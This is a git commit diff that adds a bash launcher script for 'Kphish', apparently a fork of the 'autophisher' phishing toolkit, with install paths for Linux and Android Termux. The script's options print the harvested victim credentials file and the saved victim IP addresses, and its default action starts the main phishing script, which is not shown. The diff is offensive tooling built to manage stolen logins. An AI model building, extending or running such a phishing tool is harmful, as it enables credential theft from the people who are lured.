e08cd81f2974c5e0d6805bbc14c00ec6990c9304
privateasif009@gmail.com <privateasif009@gmail.com>
2023-03-30 04:56:51 +0600

    Asif

---
+++ scripts/launch.sh
@@ -0,0 +1,32 @@
+#!/bin/bash
+
+# https://github.com/CodingRanjith/autophisher
+
+if [[ $(uname -o) == *'Android'* ]];then
+	KPHISH_ROOT="/data/data/com.termux/files/usr/opt/autophisher"
+else
+	export KPHISH_ROOT="/opt/Kphish"
+fi
+
+if [[ $1 == '-h' || $1 == 'help' ]]; then
+	echo "To run Kphish type \`Kphish\` in your cmd"
+	echo
+	echo "Help:"
+	echo " -h | help : Print this menu & Exit"
+	echo " -c | auth : View Saved Credentials"
+	echo " -i | ip   : View Saved Victim IP"
+	echo
+elif [[ $1 == '-c' || $1 == 'auth' ]]; then
+	cat $KPHISH_ROOT/auth/usernames.dat 2> /dev/null || {
+		echo "No Credentials Found !"
+		exit 1
+	}
+elif [[ $1 == '-i' || $1 == 'ip' ]]; then
+	cat $KPHISH_ROOT/auth/ip.txt 2> /dev/null || {
+		echo "No Saved IP Found !"
+		exit 1
+	}
+else
+	cd $KPHISH_ROOT
+	bash ./kphish.sh
+fi
